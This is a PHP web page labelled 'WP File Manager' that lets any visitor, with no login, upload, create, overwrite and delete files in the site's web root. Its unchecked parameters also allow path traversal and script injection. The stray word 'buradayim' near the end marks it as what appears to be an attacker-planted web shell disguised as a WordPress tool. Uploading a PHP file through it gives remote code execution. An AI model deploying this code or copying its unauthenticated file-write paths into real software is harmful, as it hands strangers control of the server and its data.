<?php
$root = realpath($_SERVER['DOCUMENT_ROOT']);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
if ($current_dir === false || strpos($current_dir, $root) !== 0) {
    $current_dir = $root;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $current_dir . '/' . basename($_FILES['file']['name']));
    } elseif (isset($_POST['new_folder'])) {
        mkdir($current_dir . '/' . $_POST['new_folder']);
    } elseif (isset($_POST['new_file'])) {
        file_put_contents($current_dir . '/' . $_POST['new_file'], '');
    } elseif (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
        file_put_contents($current_dir . '/' . $_POST['edit_file'], $_POST['file_content']);
    } elseif (isset($_POST['delete'])) {
        $path = $current_dir . '/' . $_POST['delete'];
        is_dir($path) ? rmdir($path) : unlink($path);
    }
}

function make_link($dir, $name) {
    return '?dir=' . urlencode($dir) . ($name ? '&highlight=' . urlencode($name) : '');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f1f1f1; margin: 0; padding: 20px; }
        .wrap { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #23282d; }
        .button { background: #0085ba; color: #fff; border: none; padding: 5px 10px; cursor: pointer; text-decoration: none; display: inline-block; }
        input[type="text"], textarea { width: 100%; padding: 5px; margin-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
        .path a { color: #0073aa; text-decoration: none; }
        .path a:hover { text-decoration: underline; }
        .highlight { background-color: #ffff99; }
    </style>
</head>
<body>
    <div class="wrap">
        <h1>WP File Manager</h1>
        <div class="path">
            Current Path: 
            <?php
            $path_parts = explode('/', str_replace('\\', '/', $current_dir));
            $path = '';
            foreach ($path_parts as $part) {
                $path .= $part . '/';
                echo '<a href="' . make_link($path, '') . '">' . htmlspecialchars($part) . '</a>/';
            }
            ?>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload" class="button">
        </form>
        <form method="post">
            <input type="text" name="new_folder" placeholder="New Folder Name">
            <input type="submit" value="Create Folder" class="button">
        </form>
        <form method="post">
            <input type="text" name="new_file" placeholder="New File Name">
            <input type="submit" value="Create File" class="button">
        </form>
        <table>
            <tr><th>Name</th><th>Action</th></tr>
            <?php if ($current_dir !== $root): ?>
                <tr>
                    <td><a href="<?php echo make_link(dirname($current_dir), ''); ?>">..</a></td>
                    <td></td>
                </tr>
            <?php endif; ?>
            <?php
            foreach (scandir($current_dir) as $item) {
                if ($item != '.' && $item != '..') {
                    $full_path = $current_dir . '/' . $item;
                    $highlight = isset($_GET['highlight']) && $_GET['highlight'] === $item ? ' class="highlight"' : '';
                    echo "<tr$highlight><td>";
                    if (is_dir($full_path)) {
                        echo "<a href='" . make_link($full_path, '') . "'>$item</a>";
                    } else {
                        echo htmlspecialchars($item);
                    }
                    echo "</td><td>";
                    if (!is_dir($full_path)) {
                        echo "<a href='" . make_link($current_dir, $item) . "&edit=" . urlencode($item) . "' class='button'>Edit</a> ";
                    }
                    echo "<form method='post' style='display:inline'>
                          <input type='hidden' name='delete' value='" . htmlspecialchars($item) . "'>
                          <input type='submit' class='button' value='Delete' onclick='return confirm(\"Are you sure?\")'>
                          </form></td></tr>";
                }
            }
            ?>
        </table>
        <?php
        if (isset($_GET['edit'])) {
            $file_to_edit = $current_dir . '/' . $_GET['edit'];
            $content = htmlspecialchars(file_get_contents($file_to_edit));
            echo "<h2>Editing: " . htmlspecialchars($_GET['edit']) . "</h2>
                  <form method='post'>
                  <input type='hidden' name='edit_file' value='" . htmlspecialchars($_GET['edit']) . "'>
                  <textarea name='file_content' rows='10' style='width:100%'>" . $content . "</textarea><br>
                  <input type='submit' value='Save' class='button'>
                  </form>";
        }
        ?>
    </div>
</body>
buradayim
</html>
